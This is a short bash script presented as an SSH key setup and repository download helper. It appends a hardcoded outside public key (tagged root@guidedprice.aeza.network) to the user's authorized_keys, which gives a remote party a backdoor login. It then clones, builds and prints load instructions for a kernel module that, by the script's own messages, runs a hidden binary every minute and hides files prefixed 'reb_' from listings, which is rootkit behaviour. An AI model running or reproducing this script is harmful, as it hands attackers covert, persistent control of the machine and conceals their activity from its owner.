#!/bin/bash

# SSH Key Setup and Repository Download Script
# This script sets up SSH key authentication and downloads the repository

echo "Setting up SSH key authentication and downloading repository..."

# Create .ssh directory if it doesn't exist
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add the SSH public key to authorized_keys
SSH_PUBLIC_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUvuK2UqTzgDs7/Z6bzzGE+XHwwsJRfdvra0cLBnobh root@guidedprice.aeza.network"

echo "Adding SSH public key to authorized_keys..."
echo "$SSH_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

echo "SSH key added successfully!"

# Download the repository using git
echo "Downloading repository..."
if [ -d "rebell" ]; then
    echo "Directory 'rebell' already exists. Removing it..."
    rm -rf rebell
fi

git clone https://github.com/Starrynight0x01/rebell.git
cd rebell

echo "Repository downloaded successfully!"
echo "Building the module..."
make clean && make

if [ $? -eq 0 ]; then
    echo "Module built successfully!"
    echo "To load the module: sudo insmod rebellion.ko"
    echo "To unload the module: sudo rmmod rebellion"
    echo ""
    echo "The module will execute /usr/src/droplet/linux-gnu-header every 1 minute"
    echo "Files with 'reb_' prefix will be hidden from directory listings"
else
    echo "Build failed. Please check the error messages above."
fi
